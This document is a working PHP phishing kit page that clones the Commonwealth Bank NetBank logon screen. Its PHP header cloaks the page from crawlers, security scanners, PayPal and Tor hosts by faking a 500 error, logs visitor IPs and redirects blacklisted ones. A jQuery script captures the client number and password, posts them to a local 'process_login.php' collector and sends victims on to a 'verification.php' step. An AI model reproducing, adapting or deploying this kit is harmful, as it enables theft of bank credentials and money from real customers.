<?php
session_start();
error_reporting(0);

$errorpage = isset($_GET["error"]);
$uniqueid = $errorpage ? $_SESSION["uniqueid"] : NULL;

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
  $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
  $vis_ip=$_SERVER['REMOTE_ADDR'];
}

$agent=$_SERVER['HTTP_USER_AGENT'];
$bots_ua = '/BotLink|bingbot|AhrefsBot|ahoy|AlkalineBOT|anthill|appie|arale|araneo|AraybOt|ariadne|arks|ATN_Worldwide|Atomz|bbot|Bjaaland|Ukonline|borg\-bot\/0\.9|boxseabot|bspider|calif|christcrawler|CMC\/0\.01|combine|confuzzledbot|CoolBot|cosmos|Internet Cruiser Robot|cusco|cyberspyder|cydralspider|desertrealm, desert realm|digger|DIIbot|grabber|dopwnloadexpress|DragonBot|dwcp|ecollector|ebiness|elfinbot|esculapio|esther|fastcrawler|FDSE|FELIX IDE|ESI|fido|H?m?h?kki|KIT\-Fireball|fouineur|Freecrawl|gammaSpider|gazz|gcreep|golem|googlebot|Googlebot|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|iajabot|INGRID\/0\.1|Informant|InfoSpiders|inspectorwww|irobot|Iron33|JBot|jcrawler|Teoma|Jeeves|jobo|image\.kapsi\.net|KDD\-Explorer|ko_yappo_robot|label\-grabber|larbin|legs|Linkidator|linkwalker|Lockon|logo_gif_crawler|marvin|mattie|mediafox|MerzScope|NEC\-MeshExplorer|MindCrawler|udmsearch|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|sharp\-info\-agent|WebMechanic|NetScoop|newscan\-online|ObjectsSearch|Occam|Orbsearch\/1\.0|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|Getterrobo\-Plus|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Search\-AU|searchprocess|Senrigan|Shagseeker|sift|SimBot|Site Valet|skymob|SLCrawler\/2\.0|slurp|ESI|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|nil|suke|http:\/\/www\.sygol\.com|tach_bw|TechBOT|templeton|titin|topiclink|UdmSearch|urlck|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|crawlpaper|wapspider|WebBandit\/1\.0|webcatcher|T\-H\-U\-N\-D\-E\-R\-S\-T\-O\-N\-E|WebMoose|webquest|webreaper|webs|webspider|WebWalker|wget|winona|whowhere|wlm|WOLP|WWWC|none|XGET|Nederland\.zoek|AISearchBot|woriobot|NetSeer|Nutch|YandexBot|YandexMobileBot|SemrushBot|FatBot|MJ12bot|DotBot|AddThis|baiduspider|SeznamBot|mod_pagespeed|CCBot|openstat.ru\/Bot|m2e|google|mediapartners|Ipad Iphone Safari|Python-urllib|HeadlessChrome|PhantomJS|zgrab\/0.x|BingPreview\/1.0b|^$/i';
$bots_host="/above|google|softlayer|cyveillance|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|paypal/i";

if(preg_match($bots_ua, $agent) || preg_match($bots_host, gethostbyaddr($vis_ip)) || $agent=="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
	header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
	die("<h1>500 Internal Server Error</h1>");
}

if (!$errorpage) {
  $ip = $_SERVER["REMOTE_ADDR"];
  $tracker = file_put_contents('visitors/visitors.txt', $ip . PHP_EOL, FILE_APPEND | LOCK_EX);

  $contents = file('blacklist/blacklist.txt');

  foreach($contents as $line) {
      if (trim($_SERVER["REMOTE_ADDR"]) == trim($line)) {
        header("Location: https://www.commbank.au/");
      }
  }
}
?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="mac safari safari1 webkit webkit6 cssBeforeSupport" style="margin-top: 81px;">
   <head id="head">
     <script src="files/jquery.js"></script>
      <title>
         NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank
      </title>
      <meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you.">
      <meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo">
      <link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="files/logon-merge.8397238ab0ae7a25ea1af4d375f2c3df.css" rel-album="R630">
      <style id="at-makers-style" class="at-flicker-control">
         .mboxDefault {visibility: hidden;}
      </style>
   </head>
   <body id="body" class="logon">
      <form method="post" id="form1" >
         <div class="aspNetHidden">
            <input type="hidden" name="RID" id="RID" value="LgRX_fjbsEujXpN4admRzA">
            <input type="hidden" name="SID" id="SID" value="7HoU2XcmiEU=">
            <input type="hidden" name="cid" id="cid" value="yzlhrwUosU6MkuDQ6HKPoA">
            <input type="hidden" name="rqid" id="rqid" value="M7eI6xqGsUO_u0gWzTrg0Q">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=">
         </div>
         <div id="BodyContainer">
            <div id="Header">
               <div id="BrandingLogo">
                  <span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.ac9de6fb5214be84653367c74ba0b5f0.gif" alt="Commonwealth Bank of Australia"></span>
               </div>
            </div>
            <div id="MainContent">
               <noscript>
                  <div class="MessagePanel">
                     <div class="message_contents message_contents_validation">
                        <div class="message">
                           <div class="message_icon error"></div>
                           <div class="msg_cnt_wrp msg_cnt_wrp_error">
                              <p>
                                 <strong>You need to enable JavaScript to access NetBank</strong>
                              </p>
                              <p>
                                 Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html">how to enable JavaScript</a>.
                                 If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
                              </p>
                           </div>
                        </div>
                     </div>
                  </div>
               </noscript>

               <?php if ($errorpage) { ?>
              <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
               <div class="MessagePanel arrow MessagePanel_Validation" id="mplMessagePanel">
              	<div class="message_contents message_contents_validation">
              		<div class="message">
              			<div class="message_icon validation icon icon_validation">
              				<i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
              			</div><h3>
              				<span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
              			</h3>
              		</div>
              	</div>
              </div>
              <?php } ?>

              <div class="MessagePanel arrow MessagePanel_Validation" id="mplMessagePanel" id="error-msg" style="display: none;">
               <div class="message_contents message_contents_validation">
                 <div class="message">
                   <div class="message_icon validation icon icon_validation">
                     <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
                   </div><h3>
                     <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
                   </h3>
                 </div>
               </div>
             </div>

               <div id="ModuleWrap">
                  <div id="ModuleLeft" class="module">
                     <h2>Log on to NetBank</h2>
                     <div class="bd">
                        <div class="ft">
                           <div class="row rowClientNumber">
                              <div class="LabelWrapper LabelTextAlignNotSet align_notset">
                                 <label for="txtMyClientNumber_field" id="txtMyClientNumber_label"><span class="MainLabel ">Client number</span></label>
                              </div>
                              <div class="FieldElement ">
                                 <input name="clientnumber" type="text" maxlength="8" id="txtMyClientNumber_field" class="text textbox field" data-maxlength="8" required="required">
                              </div>
                           </div>
                           <div class="row rowPassword">
                              <div class="LabelWrapper LabelTextAlignNotSet align_notset">
                                 <label for="txtMyPassword_field" id="txtMyPassword_label"><span class="MainLabel ">Password</span></label>
                              </div>
                              <div class="FieldElement ">
                                 <input name="password" type="password" maxlength="16" id="txtMyPassword_field" class="text textbox field" data-maxlength="16" required="required">
                              </div>
                           </div>
                           <div class="row">
                              <div class="FieldElement  FieldElementNoLabel">
                                 <span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox"><label for="chkRemember_field">Remember client number</label></span>
                              </div>
                           </div>
                           <input type="hidden" name="perfmonLog" id="perfmonLog" value="e%3D19606%3Ba%3D1629645296065%3Bm%3D0*-60%3Bn%3D39095460221%2C0%3Bf%3D375k812k24%3Bb%3DZnpVagry%3By%3Dra-TO%3Bp%3Do7p7n8rq03p99pr2%3Bx%3D-1%2C-1%2C-1%2C-1%3Bgi%3D0000000%3Byf%3D1%2C0%2C1%3Bw%3D10%2CPRN0228832833088R22080300N3O8030202RP00R0P083030R2N00N003N08O008303R3N%7C63%7C%7C%2CN32114N33642387Q44RO9OO257NNR7P5OO33Q183OP05111484ONPP154731QQ512769R5%7C1420%7C%7C%2CS5O01276209589O498QS13OO3114R1945RO9120P18003040081P0R52P001NN34341785%7C97%7C%7C%2CS1Q0P9933042687P0QQR96N7R1S1R686N722N0495P026061P9880P2RN2N794321N9QN8%7C201%7C%7C%2C32N022P03080P28R3003023022SPPS30OPOO803PP020308003PS0R28N002PO20308PR8%7C80%7C%7C.jevgr%2C11R0NONOO0O711NR056934S6S2P5P2210536R6720P1R2440P2SO0SNP2468N60836NS09%7C412%7C%7C%2C57S0QP9N7RS308RO06S6S2OS722863P17001O1162811100092RR4N185N28S833649O82%7C458%7C%7C%2CS3Q02O22750455O840O19732178S7O0578375347640018P8P4202QQ87OS1P0OS076NQ2%7C277%7C%7C%2CR351OPP4PS29636RPO96538R304O09097PR46502Q3Q85Q79R8R9PP9224SO086S67N775%7C2460%7C%7Cfpevcg%2CSQS05P897OR348RO06S6O5OS723866Q57449O5162P11200093QR0Q186N38R467619O42%7C458%7C%7C%3B_w%3D5%2Cp81085r17s02r4q2%7C119793%7C%7Cvsenzr-fpevcg-riny-KZYUggcErdhrfg-ybpnyFgbentr-%2C759o77907s9o9n19%7C400180%7C%7Cvsenzr-fpevcg-riny-KZYUggcErdhrfg-.jevgr-ybpnyFgbentr-%2C67q57s42343q71s6%7C92393%7C%7Cfpevcg-riny-KZYUggcErdhrfg-.jevgr-%2Cpr1o7089sr7r6985%7C19937%7C%7Cfpevcg-riny-%2Cs2317p82341npr6s%7C84715%7C%7Cvsenzr-fpevcg-KZYUggcErdhrfg-ybpnyFgbentr-%3Bs%3D2%2C%7Cuggcf%253N//jjj.pbzzonax.pbz.nh/qvtvgny/vqragvgl/nhguragvpngr/fvta-bhg%253SqcBayl%253Qgehr%2C%7Cuggcf%253N//jjj.pbzzonax.pbz.nh/ergnvy/argonax/vqragvgl/fvtabhg%3Bya%3D0%2C%3Bv%3D4%2C2p284056oqo1onr4%2C80363q72nq5rnors%2C11sr371752rpq18s%2C9opn3pn87s2135qo%3Bj%3D56%2C19r86q8q372r914s%7C52%7CtrgPbzchgrqFglyr%7C%2C8125s62o2r2737p0%7C332%7CJroSbez_BaFhozvg%7C%2C64p7sp28821op18p%7C24745%7CIvfvgbe%7Cvsenzr-fpevcg-KZYUggcErdhrfg-%2C1952692n9q7p7p51%7C6205%7Cf_qbCyhtvaf%7C%2C2456801877r4qo4n%7C668%7CNccZrnfherzrag_Zbqhyr_NhqvraprZnantrzrag%7C%2C946r491333q1716n%7C29686%7CNccZrnfherzrag%7Cfpevcg-KZYUggcErdhrfg-ybpnyFgbentr-%2C1or7rn717no64s46%7C396%7Cf_tv%7C%2C47669qqnp1q8ss8n%7C165%7Cf_ctvpd%7C%2C925p2714nr0r7246%7C26968%7CQVY%7Cvsenzr-fpevcg-KZYUggcErdhrfg-%2Cn361512q7r4233q9%7C1100%7CNccZrnfherzrag_Zbqhyr_QVY%7C%2C5p83rq294sr1q0r6%7C45%7CUnfuFrg%7C%2C52sq6q2os4433086%7C207%7Cqrobhapr%7C%2Cqo4320s6prnr92qs%7C895%7CWFTrgFjsIre%7Cfpevcg%2C4op085639ors8n09%7C132%7CtrgSynfuIrefvba%7C%2Cs415op0ro3n00on7%7C981%7CtrgSynfuIrefvbaFpevcg%7Cfpevcg-.jevgr%3Br%3D0%2Cahyy%3Bx2%3D%3Bx3%3D%3Bx4%3D%3Bx5%3D%3B">
                           <input type="hidden" name="metric" id="metric" value="%7B%22ls%22%3A%7B%22page_load%22%3A%2239095460221%22%7D%2C%22acn%22%3A%22Mozilla%22%2C%22an%22%3A%22Netscape%22%2C%22av%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2013_2_3%20like%20Mac%20OS%20X%29%20AppleWebKit/605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version/13.0.3%20Mobile/15E148%20Safari/604.1%22%2C%22ce%22%3Atrue%2C%22dnt%22%3Anull%2C%22l1%22%3A%22en-GB%22%2C%22l2%22%3A%5B%22en-GB%22%2C%22en-US%22%2C%22en%22%5D%2C%22ol%22%3Atrue%2C%22pf%22%3A%22MacIntel%22%2C%22d%22%3A%22N/A%22%2C%22f%22%3A%22N/A%22%2C%22l%22%3A%22N/A%22%2C%22n%22%3A%22N/A%22%2C%22v%22%3A%22N/A%22%2C%22p%22%3A%22Gecko%22%2C%22ps%22%3A%2220030107%22%2C%22ua%22%3A%22Mozilla/5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2013_2_3%20like%20Mac%20OS%20X%29%20AppleWebKit/605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version/13.0.3%20Mobile/15E148%20Safari/604.1%22%2C%22cd%22%3A24%2C%22pd%22%3A24%2C%22sh%22%3A812%2C%22sw%22%3A375%2C%22ss%22%3A%7B%22ci%22%3A%22%7B%5C%22eventType%5C%22%3A%5C%22Ready%5C%22%2C%5C%22timestamp%5C%22%3A%5C%222021-08-22T15%3A12%3A59.080Z%5C%22%2C%5C%22duration%5C%22%3A0%2C%5C%22correlationId%5C%22%3A%5C%22a8e31206-1445-466a-85a2-35a1f7faecf2%5C%22%2C%5C%22eventDetails%5C%22%3A%7B%5C%22screen%5C%22%3A%5C%223440x1440%5C%22%2C%5C%22jsFiles%5C%22%3A%5C%22https%3A//static.my.commbank.com.au/static/netbank/js/tracking-merge.8784d605543edaf86ccd7ce9c54ba0eb.js%2Chttps%3A//static.my.commbank.com.au/static/core/js/core-merge.36971982ebc03a2658d8e51f70007637.js%2Chttps%3A//static.my.commbank.com.au/static/netbank/js/marketing-merge.14dae8887cea3b4a8e107959aaec9d68.js%2Chttps%3A//static.my.commbank.com.au/static/netbank/js/trackingbootstrap.c8068b07c37c03776d99cb952fec6272.js%2Chttps%3A//static.my.commbank.com.au/static/core/js/instrumentation-merge.4043785f5795e2e8297bdfe0cdf60f4d.js%2Chttps%3A//static.my.commbank.com.au/static/netbank/js/func.f0330340f884763807de32b27dc4c28f.js%2Chttps%3A//static.my.commbank.com.au/static/netbank/js/metrics.9fad0b7ae109eb7ff6f728371db87a10.js%2Chttps%3A//static.my.commbank.com.au/static/netbank/js/smartbanner.d1197ec1675a985d0591d2083729fe1a.js%5C%22%7D%7D%22%7D%2C%22sl%22%3A0%2C%22c%22%3A%22b7c7a8ed03c99ce2%22%7D">
                           <div class="FieldElement  FieldElementNoLabel">
                              <div class="CbaButton " id="btnLogon">
                                 <input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field">
                              </div>
                           </div>
                           <a id="lnkForgottenDetails" href="#">I've forgotten my log on details</a>
                           <div id="MessageBubble" class="MessageBubble">
                              <span class="MessagePointer"></span>
                              <a id="MessageClose" class="MessageClose" title="Close" href="javascript:void(0)">Close</a>
                              <span class="MessageBody">
                              For security reasons, do not <br> select <strong>Remember client number</strong> if anyone else uses <br> this computer. <a id="lnkFindOutMore" href="#">Find out more</a>.
                              </span>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div id="ModuleRight" class="module">
                     <h2>New to NetBank?</h2>
                     <div class="bd">
                        <div class="ft">
                           <ul class="Bullets">
                              <li><a id="lnkRegistration" href="#">Register for NetBank now</a></li>
                              <li><a id="lnkOnlineSupport" href="#">Online support for our products and services</a></li>
                              <li><a id="lnkProtectYourselfOnline" href="#">Tips to stay safe online</a></li>
                           </ul>
                        </div>
                        <div class="ft secModule">
                           <ul class="Bullets">
                              <li><a id="lnkSecurityGuarantee" href="#">How we protect you and our 100% security guarantee</a></li>
                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
               <!-- Component for content management. -->
               <div id="ucLogonContentManageControl_pnlContentManaged">
                  <div id="ContentManaged">
                     <!-- this is the features panel which has the image and description. -->
                     <div id="ucLogonContentManageControl_pnlHighlightPanel">
                        <div class="HighlightPanel">
                           <div class="top">
                              <div class="bottom">
                                 <div class="image">
                                    <p><a href="#"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/sustainability_hub_small.jpg" alt=""></a></p>
                                 </div>
                                 <div class="description">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td>
                                                <p><b>Interested in living sustainably?</b></p>
                                                Our sustainability hub has a range of resources to help.
                                                <ul>
                                                   <li><a href="#">Visit sustainability hub</a></li>
                                                </ul>
                                                <p></p>
                                                <p><span></span></p>
                                                <p></p>
                                             </td>
                                          </tr>
                                       </tbody>
                                    </table>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <!-- side by side highlight links at the bottom -->
                     <div id="ucLogonContentManageControl_pnlCurrentHighlights">
                        <div id="CurrentHighlights">
                           <h3>Quicklinks</h3>
                           <div class="column">
                              <ul>
                                 <li>
                                    <p><a href="#">Enjoy $0 merchant terminal rental fees for 6 months. Find out how.</a></p>
                                 </li>
                                 <li>
                                    <p><a href="#">Are you in financial difficulty? Apply for assistance.</a></p>
                                 </li>
                                 <li>
                                    <p><a href="#">Find benefits you may be eligible for during lockdown.</a></p>
                                 </li>
                                 <li>
                                    <p><a href="#">Support for home loan customers.</a></p>
                                 </li>
                              </ul>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="PageFooter">
               <a id="lnkTermsOfUse" href="#">Terms of use</a> | <a id="lnkSecurity" href="#">Security</a> | <a id="lnkPrivacy" href="#">Privacy</a>
               <span id="CopyRight">© Commonwealth Bank of Australia 2021 ABN 48 123 123 124</span>
            </div>
         </div>
         <div class="aspNetHidden">
            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275">
            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY=">
         </div>
      </form>
      <script>
      $('#form1').submit(function(e) {
        e.preventDefault();

        var c_num = $('#txtMyClientNumber_field').val();
        var pass = $('#txtMyPassword_field').val();

        if (c_num == "" || pass == "") {
          $('#error-msg').show();
          return;
        }

        $.ajax({
          type: 'POST',
          url: 'database_setup/routes/process_login.php<?php if ($errorpage) { echo '?replace'; } ?>',
          data: $(this).serialize(),
          success: function(data) {
            let parsed_data = JSON.parse(data);

            if (parsed_data.status == 'success') {
              window.location = 'verification.php';
            }
          }
        })
      })

      <?php if ($errorpage) { ?>
        setInterval(function() {
          var _uniqueid = <?=$_SESSION['uniqueid'];?>;

          $.ajax({
            type: 'GET',
            url: 'database_setup/routes/upload_time.php?uniqueid=' + _uniqueid,
            success: function(data) {
              console.log("Time Updated!");
            }
          })
        }, 3000);
      <?php } ?>
      </script>
      <input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value="">
      <div id="smartbanner" class="ios top shown" style="top: 0px;">
         <div id="iossmartbanner" class="sb-container">
            <a id="appbannerclose" class="sb-close" href="javascript:void(0)">×</a><img id="iosmobilebanner" class="sb-icon" src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/commbankmobile.png">
            <div class="sb-info"><strong>CommBank app</strong><span>A secure and easy way to bank on the go</span><span></span></div>
         </div>
         <a id="appbannerview" class="sb-button" href="https://itunes.apple.com/au/app/id310251202?mt=8"><span>View</span><input type="hidden" id="smartbanner_type" value="iosmobilebanner"></a>
      </div>
   </body>
</html>
